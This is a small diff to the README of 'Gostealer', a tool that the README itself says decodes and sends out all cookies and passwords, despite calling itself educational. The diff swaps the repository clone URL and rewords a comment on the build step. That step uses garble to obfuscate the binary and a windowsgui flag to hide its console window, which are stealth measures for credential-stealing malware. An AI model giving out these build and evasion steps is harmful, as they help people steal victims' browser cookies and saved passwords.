@@ -31,7 +31,7 @@ Gostealer is an educational project that decodes and sends all cookies, password
 * Clone the repo
 ```sh
 # You must have git preinstalled
-git clone https://github.com/Ruzie/urban.git
+git clone https://github.com/4kord/gostealer.git
 ```
 
 * Install Go
@@ -49,7 +49,7 @@ brew install golang
 ```sh
 # Change current directory to the cloned one and run make command
 cd gostealer
-garble -seed=random build -ldflags -H=windowsgui #make sure you installed garble
+garble -seed=random build -ldflags -H=windowsgui # Make sure garble is installed
 ```
 And that's it! Make should create a build folder, move there and run the program.
 
